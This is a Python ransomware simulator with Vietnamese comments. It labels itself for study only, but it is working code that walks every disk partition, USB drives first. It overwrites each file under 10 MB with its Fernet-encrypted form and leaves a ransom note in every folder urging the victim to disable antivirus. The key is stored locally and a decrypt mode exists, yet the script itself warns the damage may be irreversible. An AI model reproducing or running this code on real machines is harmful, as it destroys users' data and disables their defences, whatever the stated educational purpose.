import os, sys
from colorama import Fore
from time import sleep
from warnings import warn
from psutil import disk_partitions
from cryptography.fernet import Fernet

class Encryptor():

    def generate_fkey():
        # Tạo key
        key = Fernet.generate_key()

        # Lưu key vào file
        with open("key.dat.survived_from_ransomware", "wb") as f:
            f.write(key)
            f.close()

    def read_fkey():
        with open("key.dat.survived_from_ransomware", "rb") as f:
            key = f.read()
            # Khởi tạo Fernet với key
            fernet = Fernet(key)
            f.close()
        return fernet

    def encrypt(filepath, fernet, confirm):
        # Mã hóa tệp
        with open(filepath, "rb") as f:
            data = f.read()
            if confirm == 'Decrypt':
                encrypted_data = fernet.decrypt(data)
            else:
                encrypted_data = fernet.encrypt(data)
            f.close()

        # Ghi đè
        with open(filepath, "wb") as f:
            f.write(encrypted_data)
            f.close()

    def message(confirm, path, message):
        try:
            if confirm == 'Decrypt':
                os.remove(path)
                return True
            else:
                if not os.path.exists(path):
                    with open(path, 'wb') as f:
                        f.write(message.encode('utf-8'))
                        f.close()
                    return True
                else:
                    return False
        except:
            return False

########################################################################

if not os.path.exists('key.dat.survived_from_ransomware'):
    Encryptor.generate_fkey()

print(Fore.GREEN+'''
                                        ,   ,
                                        $,  $,     ,
                                        "ss.$ss. .s'
                                ,     .ss$$$$$$$$$$s,
                                $. s$$$$$$$$$$$$$$`$$Ss
                                "$$$$$$$$$$$$$$$$$$o$$$       ,
                               s$$$$$$$$$$$$$$$$$$$$$$$$s,  ,s
                              s$$$$$$$$$"$$$$$$""""$$$$$$"$$$$$,
                              s$$$$$$$$$$s""$$$$ssssss"$$$$$$$$"
                             s$$$$$$$$$$'         `"""ss"$"$s""
                             s$$$$$$$$$$,              `"""""$  .s$$s
                             s$$$$$$$$$$$$s,...               `s$$'  `
                         `ssss$$$$$$$$$$$$$$$$$$$$####s.     .$$"$.   , s-
                           `""""$$$$$$$$$$$$$$$$$$$$#####$$$$$$"     $.$'
                                 "$$$$$$$$$$$$$$$$$$$$$####s""     .$$$|
                                  "$$$$$$$$$$$$$$$$$$$$$$$$##s    .$$" $
                                   $$""$$$$$$$$$$$$$$$$$$$$$$$$$$$$$"   `
                                  $$"  "$"$$$$$$$$$$$$$$$$$$$$S""""'
                             ,   ,"     '  $$$$$$$$$$$$$$$$####s
                             $.          .s$$$$$$$$$$$$$$$$$####"
                 ,           "$s.   ..ssS$$$$$$$$$$$$$$$$$$$####"
                 $           .$$$S$$$$$$$$$$$$$$$$$$$$$$$$#####"
                 Ss     ..sS$$$$$$$$$$$$$$$$$$$$$$$$$$$######""
                  "$$sS$$$$$$$$$$$$$$$$$$$$$$$$$$$########"
           ,      s$$$$$$$$$$$$$$$$$$$$$$$$#########""'
           $    s$$$$$$$$$$$$$$$$$$$$$#######""'      s'         ,
           $$..$$$$$$$$$$$$$$$$$$######"'       ....,$$....    ,$
            "$$$$$$$$$$$$$$$######"' ,     .sS$$$$$$$$$$$$$$$$s$$
              $$$$$$$$$$$$#####"     $, .s$$$$$$$$$$$$$$$$$$$$$$$$s.
   )          $$$$$$$$$$$#####'      `$$$$$$$$$###########$$$$$$$$$$$.
  ((          $$$$$$$$$$$#####       $$$$$$$$###"       "####$$$$$$$$$$
  ) \         $$$$$$$$$$$$####.     $$$$$$###"             "###$$$$$$$$$   s'
 (   )        $$$$$$$$$$$$$####.   $$$$$###"                ####$$$$$$$$s$$'
 )  ( (       $$"$$$$$$$$$$$#####.$$$$$###'                .###$$$$$$$$$$"
 (  )  )   _,$"   $$$$$$$$$$$$######.$$##'                .###$$$$$$$$$$
 ) (  ( \.         "$$$$$$$$$$$$$#######,,,.          ..####$$$$$$$$$$$"
(   )$ )  )        ,$$$$$$$$$$$$$$$$$$####################$$$$$$$$$$$"
(   ($$  ( \     _sS"  `"$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$S$$,
 )  )$$$s ) )  .      .   `$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$"'  `$$
  (   $$$Ss/  .$,    .$,,s$$$$$$##S$$$$$$$$$$$$$$$$$$$$$$$$S""        '
    \)_$$$$$$$$$$$$$$$$$$$$$$$##"  $$        `$$.        `$$.
        `"S$$$$$$$$$$$$$$$$$#"      $          `$          `$
            `"""""""""""""'         '           '           '
''')
print(Fore.GREEN+f'Đây là trình mô phỏng tấn công Ransomware - Phần mềm độc hại mã hóa tệp tin người dùng và yêu cầu tiền chuộc để lấy key giải mã, chỉ dùng cho mục đích học tập và nghiên cứu.\n{Fore.YELLOW}Chương trình này chỉ nên được sử dụng trong máy ảo hoặc môi trường riêng biệt như hộp cát.{Fore.GREEN}\nTệp tin "{Fore.YELLOW}key.dat.survived_from_ransomware{Fore.GREEN}" sẽ được tạo (nếu không tồn tại) có chứa key để giải mã sau này. Tệp này sẽ không bị tấn công.')
confirm = str(input(Fore.YELLOW+'Nhập "Ransomware" để thực thi hoặc "Decrypt" để giải mã\n>>> '+Fore.WHITE))
if (confirm != 'Ransomware') and (confirm != 'Decrypt'):
    os._exit(0)

# Bộ đếm ngược
print(Fore.YELLOW+'CHƯƠNG TRÌNH NÀY SẼ MÃ HÓA TẤT CẢ NHỮNG TỆP THỎA ĐIỀU KIỆN MÀ CHÚNG TÌM THẤY. MẶC DÙ CÓ THỂ GIẢI MÃ, CÁC TỆP ĐÃ BỊ MÃ HÓA CÓ THỂ GÂY BẤT THƯỜNG TRONG HỆ THỐNG VÀ KHÔNG THỂ HOÀN TÁC. HÃY CHẮC CHẮN RẰNG BẠN ĐÃ ĐỌC KỸ VÀ CHẤP NHẬN RỦI RO KHI CHẠY.')
for i in range(15, -1, -1):
    print(Fore.GREEN+f'Quá trình sẽ bắt đầu sau {Fore.WHITE}{i}{Fore.GREEN} giây...', end='\r')
    sleep(1)
    if i == 0:
        print(f'\n{Fore.YELLOW}Đang bắt đầu...')

# Mã hóa
def encryptor(root, fernet, confirm):
    for path, subdirs, files in os.walk(root, topdown=False):
        for name in files:
            if ((str(name) != 'key.dat.survived_from_ransomware')):
                filepath = os.path.join(path, name)
                
                if (os.path.getsize(filepath) < 10*(2**20)) or (confirm == "Decrypt"): # Bỏ qua nếu tệp >= 10MB hoặc nếu là giải mã sẽ thông qua (do sau khi mã hóa sẽ tăng kích cỡ tệp)
                    try:
                        
                        Encryptor.encrypt(filepath, fernet, confirm)
                        print(Fore.GREEN+f'[Đã giải mã] {Fore.BLUE}{filepath}') if confirm == 'Decrypt' else print(Fore.RED+f'[Đã mã hóa] {Fore.BLUE}{filepath}')
                    except:
                        warn(Fore.YELLOW+'[Lỗi] Không có quyền truy cập tệp.')
                else:
                    warn(Fore.YELLOW+'[Lỗi] Tệp có kích cỡ lớn hơn cho phép.')
        Encryptor.message(confirm, os.path.join(path, 'Thư tống tiền (fake).txt'), f'Lời nhắn từ: {str(sys.argv[0])}\nTệp tin của bạn đã bị mã hóa. Tắt hết mọi trình Anti-virus, Windows Defender... và không xóa tệp thực thi này. Sao chép "key.dat.survived_from_ransomware" đã được tạo trước đó vào cùng thư mục của tệp thực thi này và chạy Decrypt để giải mã.')

if __name__ == "__main__":
    # Đọc key từ file
    fernet = Encryptor.read_fkey()

    # Tạo danh sách tệp
    roots = disk_partitions()
    roots.reverse() # Đảo ngược thứ tự tấn công: Luôn nhắm vào các phân vùng chứa dữ liệu và USB đầu tiên.
    for root in roots:
        root = os.fspath(root.mountpoint)
        encryptor(root, fernet, confirm)
    
input(Fore.YELLOW+'Hoàn thành...\n'+Fore.BLACK)